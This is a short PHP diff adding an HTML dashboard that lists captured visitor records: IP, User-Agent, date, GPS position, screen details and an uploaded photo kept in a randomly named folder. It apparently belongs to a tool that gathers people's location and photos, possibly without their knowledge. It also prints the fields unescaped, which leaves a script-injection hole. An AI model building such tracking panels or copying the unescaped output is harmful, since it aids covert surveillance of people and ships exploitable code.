@@ -133,3 +133,40 @@ foreach (array_reverse($dados) as $ip => $itens) {
 		$tela = "";
 	}
 
+	if (strval($gps) != "0"){
+		$gps = "<li><strong>GPS: </strong> " . $gps . "</li>";
+	}else{
+		$gps = "";
+	}
+
+	if ($foto != 0){
+		$foto = '<img src="7xqKWj2di/uploads/' . $foto . '" alt="FOTO" class="client-photo">';
+	}else{
+		$foto = "";
+	}
+
+	$ip = "<li><strong>IP:</strong> " . $ip . "</li>";
+	$ua = "<li><strong>User-Agent:</strong> " . $itens["UA"] . "</li>";
+
+
+	echo '
+            <div class="client-card">
+		' . $foto . '
+                <ul>
+                    ' . $ip . '
+                    ' . $ua . '
+                    ' . $data . '
+                    ' . $gps . '
+                    ' . $tela . '
+                </ul>
+            </div>
+
+	';
+}
+?>
+
+        </div>
+    </div>
+</body>
+
+</html>
